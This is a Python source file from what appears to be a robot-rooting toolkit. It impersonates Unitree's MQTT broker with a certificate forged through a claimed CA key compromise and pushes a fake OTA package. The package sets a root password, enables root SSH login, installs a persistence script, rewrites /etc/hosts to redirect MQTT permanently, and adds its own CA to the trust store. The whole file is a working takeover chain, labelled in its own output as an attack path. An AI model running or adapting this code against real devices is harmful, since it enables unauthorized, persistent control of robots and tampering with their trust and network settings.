"""
MQTT-first enrollment orchestrator for Unitree Go2.

Enrolls a robot without WebRTC — no AES key needed for firmware >= 1.1.15.
Leverages CVE-2026-111943 (eMudhra intermediate CA key compromise) to present
a TLS certificate the robot trusts, then pushes an OTA payload via the
existing MQTT updateModule command to install SSH.

Requires LAN adjacency and DNS redirect (the robot must resolve
global-robot-mqtt.unitree.com to this machine).

Flow:
  [1/5] Generate eMudhra-signed TLS cert for MQTT hostnames
  [2/5] Start broker + UPK file server, wait for robot to connect
  [3/5] Build init-ssh UPK package
  [4/5] Push updateModule to robot via MQTT
  [5/5] Wait for SSH, install persistence + permanent MQTT redirect
"""

import asyncio
import logging
import socket
import time
from pathlib import Path

import paramiko

from ..broker.server import UnleashBroker, MQTTClient
from ..broker.auth import UnitreeAuthProvider
from ..certs.emudhra import generate_emudhra_signed
from ..packages.builder import build_package_to_file
from ..packages.file_server import UPKFileServer
from ..packages.ota_protocol import build_update_envelope
from ..enroll.payloads import SSH_GUARD_SCRIPT

logger = logging.getLogger("unleash.enroll.mqtt_enroll")

G = "\033[1;32m"; R = "\033[1;31m"; Y = "\033[1;33m"; C = "\033[1;36m"
DIM = "\033[2m"; BOLD = "\033[1m"; RESET = "\033[0m"

MODULE_NAME = "system_patch"
MODULE_VERSION = "1.0.0"


def _detect_lan_ip() -> str:
    for target in ("192.168.123.161", "8.8.8.8"):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((target, 80))
            ip = s.getsockname()[0]
            s.close()
            if ip and not ip.startswith("127."):
                return ip
        except Exception:
            continue
    return ""


def _check_ssh(ip, port=22, timeout=2.0):
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def _ssh_exec(ssh, cmd):
    _, stdout, stderr = ssh.exec_command(cmd)
    return stdout.read().decode(errors="replace")


def _build_ssh_upk(password: str, output_dir: Path, advertise_host: str, upk_port: int):
    """Build a UPK package whose CmdPreList enables SSH."""
    commands = [
        {"Cmd": "mkdir -p /run/sshd && chmod 755 /run/sshd"},
        {"Cmd": f"echo 'root:{password}' | /usr/sbin/chpasswd"},
        {"Cmd": (
            "sed -i 's/^#*\\s*PermitRootLogin.*/PermitRootLogin yes/' "
            "/etc/ssh/sshd_config 2>/dev/null; true"
        )},
        {"Cmd": (
            "systemctl enable ssh 2>/dev/null; "
            "systemctl start ssh 2>/dev/null; "
            "/usr/sbin/sshd 2>/dev/null; true"
        )},
    ]

    output_dir.mkdir(parents=True, exist_ok=True)
    upk_path, payload_md5, file_size = build_package_to_file(
        commands=commands,
        output=output_dir / f"{MODULE_NAME}.upk",
        module_name=MODULE_NAME,
        version=MODULE_VERSION,
    )

    url = f"http://{advertise_host}:{upk_port}/{MODULE_NAME}.upk"

    envelope = build_update_envelope(
        module_name=MODULE_NAME,
        version=MODULE_VERSION,
        url=url,
        sign=payload_md5,
        size=file_size,
        mqtt_module_name=MODULE_NAME[:2],
    )

    return upk_path, envelope


class MQTTEnrollSession:
    """MQTT-first enrollment: bypass WebRTC auth via CVE-2026-111943."""

    def __init__(
        self,
        broker_ip: str = "",
        password: str = "unleash",
        mqtt_port: int = 17883,
        upk_port: int = 8899,
        ca_bundle: str | None = None,
        skip_persist: bool = False,
        skip_redirect: bool = False,
        timeout: float = 300,
        data_dir: Path | None = None,
    ):
        self.broker_ip = broker_ip or _detect_lan_ip()
        self.password = password
        self.mqtt_port = mqtt_port
        self.upk_port = upk_port
        self.ca_bundle = ca_bundle
        self.skip_persist = skip_persist
        self.skip_redirect = skip_redirect
        self.timeout = timeout
        self.data_dir = data_dir or Path("./data")

        self._robot_connected = asyncio.Event()
        self._connected_serial: str = ""
        self._connected_ip: str = ""
        self._broker: UnleashBroker | None = None
        self._file_server: UPKFileServer | None = None

    def _on_robot_connect(self, serial: str, client: MQTTClient):
        """Callback fired when a robot authenticates to the broker."""
        self._connected_serial = serial
        self._connected_ip = client.ip_address
        self._robot_connected.set()

    async def run(self) -> bool:
        print()
        print(f"  {C}{'=' * 62}{RESET}")
        print(f"  {C} MQTT-First Enrollment (CVE-2026-111943){RESET}")
        print(f"  {C}{'=' * 62}{RESET}")
        print(f"  {C}  Broker:   {self.broker_ip}:{self.mqtt_port}{RESET}")
        print(f"  {C}  UPK srv:  {self.broker_ip}:{self.upk_port}{RESET}")
        print(f"  {C}{'=' * 62}{RESET}")
        print()

        try:
            if not await self._step_cert():
                return False
            if not await self._step_broker():
                return False
            if not await self._step_wait_connect():
                return False
            if not await self._step_push_ota():
                return False
            if not await self._step_post_ssh():
                return False
        finally:
            await self._cleanup()

        self._print_summary()
        return True

    async def _step_cert(self) -> bool:
        """[1/5] Generate eMudhra-signed TLS certificate."""
        print(f"  {G}[1/5]{RESET} Generating eMudhra-signed TLS cert...", end="", flush=True)
        try:
            self._cert_path, self._key_path = generate_emudhra_signed(
                cert_dir=self.data_dir / "certs" / "emudhra",
                ca_bundle=self.ca_bundle,
            )
            print(f"  {G}✓{RESET}  cert ready")
            return True
        except (FileNotFoundError, ValueError) as e:
            print(f"  {R}✗{RESET}  {e}")
            return False

    async def _step_broker(self) -> bool:
        """[2/5] Start broker and UPK file server."""
        print(f"  {G}[2/5]{RESET} Starting MQTT broker + UPK server...", end="", flush=True)
        try:
            self._broker = UnleashBroker(
                host="0.0.0.0",
                port=self.mqtt_port,
                cert_path=self._cert_path,
                key_path=self._key_path,
                auth_provider=UnitreeAuthProvider(),
                require_auth=True,
                use_tls=True,
            )
            self._broker.on_connect(self._on_robot_connect)
            await self._broker.start()

            pkg_dir = self.data_dir / "packages"
            pkg_dir.mkdir(parents=True, exist_ok=True)
            self._file_server = UPKFileServer(
                package_dir=pkg_dir,
                host="0.0.0.0",
                port=self.upk_port,
            )
            await self._file_server.start()

            print(f"  {G}✓{RESET}  listening")
            return True
        except Exception as e:
            print(f"  {R}✗{RESET}  {e}")
            return False

    async def _step_wait_connect(self) -> bool:
        """[2/5 cont.] Wait for a robot to connect."""
        print(f"       Waiting for robot to connect (timeout {self.timeout:.0f}s)...",
              end="", flush=True)
        print()
        print(f"       {DIM}Ensure DNS for global-robot-mqtt.unitree.com → {self.broker_ip}{RESET}")
        print(f"       {DIM}Robot will connect on its own MQTT reconnect cycle{RESET}")

        try:
            await asyncio.wait_for(self._robot_connected.wait(), timeout=self.timeout)
        except asyncio.TimeoutError:
            print(f"  {R}✗{RESET}  timed out — no robot connected")
            return False

        print(f"       {G}✓{RESET}  robot connected: serial={self._connected_serial} "
              f"ip={self._connected_ip}")
        return True

    async def _step_push_ota(self) -> bool:
        """[3/5] Build UPK and push updateModule to robot."""
        print(f"  {G}[3/5]{RESET} Pushing OTA init-ssh payload...", end="", flush=True)
        try:
            upk_path, envelope = _build_ssh_upk(
                password=self.password,
                output_dir=self.data_dir / "packages",
                advertise_host=self.broker_ip,
                upk_port=self.upk_port,
            )
            logger.debug("built UPK at %s", upk_path)

            ok = await self._broker.send_command(self._connected_serial, envelope)
            if not ok:
                print(f"  {R}✗{RESET}  failed to publish command")
                return False

            print(f"  {G}✓{RESET}  updateModule sent")
            return True
        except Exception as e:
            print(f"  {R}✗{RESET}  {e}")
            logger.exception("OTA push failed")
            return False

    async def _step_post_ssh(self) -> bool:
        """[4/5] Wait for SSH, then install persistence + redirect."""
        print(f"  {G}[4/5]{RESET} Waiting for SSH on {self._connected_ip}...", end="", flush=True)

        deadline = time.time() + 120
        while time.time() < deadline:
            if _check_ssh(self._connected_ip):
                break
            await asyncio.sleep(3)
        else:
            print(f"  {R}✗{RESET}  SSH did not come up within 120s")
            return False

        print(f"  {G}✓{RESET}  sshd running")

        print(f"  {G}[5/5]{RESET} Installing persistence + redirect...", end="", flush=True)

        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self._connected_ip, username="root", password=self.password, timeout=10)
        except Exception as e:
            print(f"  {R}✗{RESET}  SSH login failed: {e}")
            return False

        try:
            if not self.skip_persist:
                self._install_guard(ssh)

            if not self.skip_redirect:
                self._install_redirect(ssh)
                self._install_ca(ssh)
                _ssh_exec(ssh, (
                    "systemctl restart unitree_mqtt_client 2>/dev/null; "
                    "systemctl restart mqtt_client 2>/dev/null; true"
                ))

            serial = _ssh_exec(ssh, (
                "cat /etc/serial_number 2>/dev/null || "
                "cat /unitree/etc/serial_number 2>/dev/null || "
                "echo unknown"
            )).strip()
            self._connected_serial = serial or self._connected_serial

            print(f"  {G}✓{RESET}  enrolled")
            return True
        except Exception as e:
            print(f"  {R}✗{RESET}  post-SSH setup failed: {e}")
            logger.exception("post-SSH setup failed")
            return False
        finally:
            ssh.close()

    def _install_guard(self, ssh):
        """Install ssh_guard.sh for persistence across reboots and OTA."""
        sftp = ssh.open_sftp()
        try:
            sftp.file("/usr/local/bin/ssh_guard.sh", "w").write(SSH_GUARD_SCRIPT)
        finally:
            sftp.close()
        _ssh_exec(ssh, "chmod 755 /usr/local/bin/ssh_guard.sh")
        _ssh_exec(ssh, "/usr/local/bin/ssh_guard.sh install")

    def _install_redirect(self, ssh):
        """Write /etc/hosts to redirect MQTT permanently to UnLeash broker."""
        hosts = (
            f"127.0.0.1 localhost\n"
            f"{self.broker_ip} global-robot-mqtt.unitree.com\n"
            f"{self.broker_ip} robot-mqtt.unitree.com\n"
        )
        sftp = ssh.open_sftp()
        try:
            with sftp.file("/etc/hosts", "w") as f:
                f.write(hosts)
        finally:
            sftp.close()

    def _install_ca(self, ssh):
        """Install the permanent UnLeash self-signed CA for future TLS."""
        from ..certs.generator import generate_self_signed, DEFAULT_CERT_DIR

        ca_cert = DEFAULT_CERT_DIR / "ca.pem"
        if not ca_cert.exists():
            try:
                generate_self_signed()
            except Exception:
                logger.debug("failed to generate UnLeash CA")
                return

        try:
            sftp = ssh.open_sftp()
            try:
                sftp.put(str(ca_cert), "/usr/local/share/ca-certificates/unleash-ca.crt")
            finally:
                sftp.close()
            _ssh_exec(ssh, "update-ca-certificates 2>/dev/null || true")
        except Exception as e:
            logger.debug("CA install failed: %s", e)

    async def _cleanup(self):
        if self._file_server:
            await self._file_server.stop()
        if self._broker:
            await self._broker.stop()

    def _print_summary(self):
        serial = self._connected_serial
        ip = self._connected_ip
        pw = self.password

        ssh_str = f"ssh root@{ip}"
        print()
        print(f"  {G}{'─' * 50}{RESET}")
        print(f"  {BOLD}MQTT enrollment complete{RESET}")
        print(f"  {G}{'─' * 50}{RESET}")
        print(f"  Serial:     {serial}")
        print(f"  IP:         {ip}")
        print(f"  Password:   {pw}")
        print(f"  SSH:        {ssh_str}")
        if not self.skip_redirect:
            print(f"  MQTT:       redirected to {self.broker_ip}")
        if not self.skip_persist:
            print(f"  Persistence: ssh_guard.sh active")
        print(f"  {G}{'─' * 50}{RESET}")
        print(f"  {DIM}Attack path: CVE-2026-111943 → MQTT → updateModule → SSH{RESET}")
        print()
